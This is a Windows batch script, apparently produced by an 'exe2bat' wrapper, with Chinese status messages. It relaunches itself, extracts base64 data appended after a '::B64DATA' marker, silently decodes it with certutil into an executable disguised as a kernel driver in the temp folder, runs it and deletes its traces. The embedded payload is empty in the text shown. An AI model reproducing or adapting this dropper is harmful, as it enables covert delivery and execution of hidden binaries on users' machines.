@echo off
cd /d "%~dp0"
set "MARKER=%temp%\exe2bat_marker.txt"
if not exist "%MARKER%" (
    echo 1 > "%MARKER%"
    for /L %%n in (1,1,2) do start "" "%~f0"
    exit
)

set "TARGET=%temp%\CMDPLUS26.7.5_KERNEL_DRIVER_2.exe"
set "B64TMP=%temp%\exe2bat_b64.tmp"
for /f "delims=:" %%i in ('findstr /n "^::B64DATA" "%~f0"') do set "B64LINE=%%i"
set /a "B64SKIP=B64LINE" >nul 2>nul
more +%B64SKIP% "%~f0" >"%B64TMP%" 2>nul
certutil -f -decode "%B64TMP%" "%TARGET%" >nul 2>nul
del /q "%B64TMP%" 2>nul

if not exist "%TARGET%" (
    echo 解码失败
    pause
    del /q "%temp%\exe2bat_marker.txt" 2>nul
    exit
)

echo 成功释放到 %TARGET%

start "" "%TARGET%"

del /q "%temp%\exe2bat_marker.txt" 2>nul
exit

::B64DATA

